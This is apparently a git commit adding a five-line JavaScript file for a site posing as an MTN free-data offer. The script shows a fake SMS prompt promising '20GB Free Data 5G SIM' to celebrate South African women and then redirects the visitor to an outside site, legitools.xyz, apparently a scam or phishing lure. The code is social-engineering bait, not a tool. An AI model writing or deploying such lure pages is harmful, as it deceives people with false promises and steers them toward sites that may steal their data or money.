3def8300834a99f1b92e446a33396aafb4f0d77c
harryjohnson86 <mfonjohnson86@gmail.com>
2025-03-09 08:25:42 -0700

    Create mtn5g-20gbdata.com.js

---
+++ mtn5g-20gbdata.com.js
@@ -0,0 +1,5 @@
+var password = '20GB Free Data'
+password=prompt('SMS: Congratulations Your Number is Eligible to receive 20GB Free Data 5G SIM TO CELEBRATE SOUTH AFRICAN WOMEN, Kindly Press OK to ACTIVATE. ','20GB Free Data');
+if (password != '20GB Free Data') {
+location.href='https://legitools.xyz/mtcsim-upgrade.10gbdata.html';
+}
